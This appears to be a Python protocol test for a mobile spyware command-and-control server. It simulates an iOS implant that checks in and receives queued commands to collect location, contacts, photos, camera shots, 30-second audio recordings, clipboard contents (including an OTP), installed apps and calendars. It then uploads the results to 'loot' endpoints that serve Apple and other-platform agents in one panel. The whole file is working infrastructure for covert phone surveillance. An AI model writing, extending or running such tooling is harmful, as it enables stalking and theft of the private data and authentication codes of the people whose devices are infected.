#!/usr/bin/env python3
"""
iOS agent protocol compatibility test.
Simulates the Swift agent's exact JSON shapes against the live C2:
  checkin (brand=Apple, sdk=0) -> queue -> poll -> result -> event -> upload -> loot
"""
import json, os, subprocess, sys, time, urllib.request

BASE = "http://127.0.0.1:8766"
HERE = os.path.dirname(os.path.abspath(__file__))

def req(method, path, data=None, headers=None, raw=False):
    r = urllib.request.Request(BASE + path, method=method, data=data, headers=headers or {})
    with urllib.request.urlopen(r, timeout=10) as resp:
        b = resp.read()
        return b if raw else json.loads(b.decode())

fails = []
def check(name, cond, extra=""):
    print(("PASS" if cond else "FAIL"), "-", name, extra)
    if not cond: fails.append(name)

# 1. iOS-shaped checkin (matches BeaconManager.swift body exactly)
d = json.dumps({"device_id": "00008030-001A2C3E1E88401E", "model": "iPhone15,2",
                "brand": "Apple", "android": "17.5", "sdk": 0}).encode()
r = req("POST", "/api/checkin", d, {"Content-Type": "application/json"})
check("ios checkin returns agent_id", "agent_id" in r, r.get("agent_id", ""))
aid = r["agent_id"]

# 2. queue iOS-only + shared commands
for cmd, args in [("location", ""), ("contacts", ""), ("photos", ""),
                  ("photo", "front"), ("audio", "30"), ("clipboard", ""),
                  ("apps", ""), ("calendar", ""), ("info", ""), ("interval", "600")]:
    r = req("POST", "/api/queue", json.dumps({"agent_id": aid, "cmd": cmd, "args": args}).encode(),
            {"Content-Type": "application/json"})
    check(f"queue {cmd}", "id" in r)

# 3. poll
cmds = req("GET", "/api/commands/" + aid)
check("poll returns 10 commands", len(cmds) == 10, f"got {len(cmds)}")
check("poll marks sent", len(req("GET", "/api/commands/" + aid)) == 0)

# 4. results (iOS-shaped outputs)
outputs = {
    "location": json.dumps({"lat": -6.2088, "lon": 106.8456, "accuracy": 5.0,
                            "time": int(time.time()), "provider": "ios"}),
    "contacts": json.dumps([{"name": "Budi Santoso", "phones": ["+6281234"], "emails": ["b@x.com"]}]),
    "photos": json.dumps([{"id": "abc/L0/001", "name": "1699000000.jpg", "type": "image",
                           "size": 4032 * 3024, "date": 1699000000, "location": "-6.2,106.8"}]),
    "info": json.dumps({"model": "iPhone15,2", "brand": "Apple", "android": "17.5",
                        "battery": 0.87, "carrier": "Telkomsel", "jailbroken": False}),
    "clipboard": "otp 88213",
    "apps": json.dumps([{"pkg": "whatsapp", "name": "WhatsApp"}]),
}
for c in cmds:
    out = outputs.get(c["cmd"], "ok")
    req("POST", "/api/result", json.dumps({"agent_id": aid, "cmd_id": c["id"], "output": out}).encode(),
        {"Content-Type": "application/json"})
check("results accepted", True)

# 5. event stream
req("POST", "/api/event", json.dumps({"agent_id": aid, "type": "location", "pkg": "ios",
    "text": json.dumps({"lat": -6.2, "lon": 106.8}), "time": int(time.time())}).encode(),
    {"Content-Type": "application/json"})
check("events accepted", True)

# 6. upload (m4a audio file, same multipart as agent)
boundary = "----warden-ios"
body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
        f"filename=\"a1699000000.m4a\"\r\nContent-Type: application/octet-stream\r\n\r\n").encode()
body += os.urandom(8192) + f"\r\n--{boundary}--\r\n".encode()
r = req("POST", "/api/upload?agent_id=" + aid + "&name=a1699000000.m4a", body,
        {"Content-Type": f"multipart/form-data; boundary={boundary}"})
check("audio upload", r.get("ok") and r.get("size") == 8192, str(r))

# 7. loot
loot = req("GET", "/api/loot/" + aid)
check("loot: 10 commands done", all(c["status"] == "done" for c in loot["commands"]))
check("loot: location result has lat", "lat" in loot["commands"][0]["result"] or
      any("lat" in (c["result"] or "") for c in loot["commands"]))
check("loot: 1 event", len(loot["events"]) == 1)
check("loot: 1 file", len(loot["files"]) == 1 and loot["files"][0]["size"] == 8192)
check("loot file downloadable", len(req("GET", "/loot/" + loot["files"][0]["path"], raw=True)) == 8192)

# 8. same C2 holds both platforms
agents = req("GET", "/api/agents")
brands = {a["brand"] for a in agents}
check("panel shows Apple + other agents together", "Apple" in brands, str(brands))

print()
if fails:
    print("FAILED:", fails); sys.exit(1)
print("ALL IOS PROTOCOL TESTS PASSED")
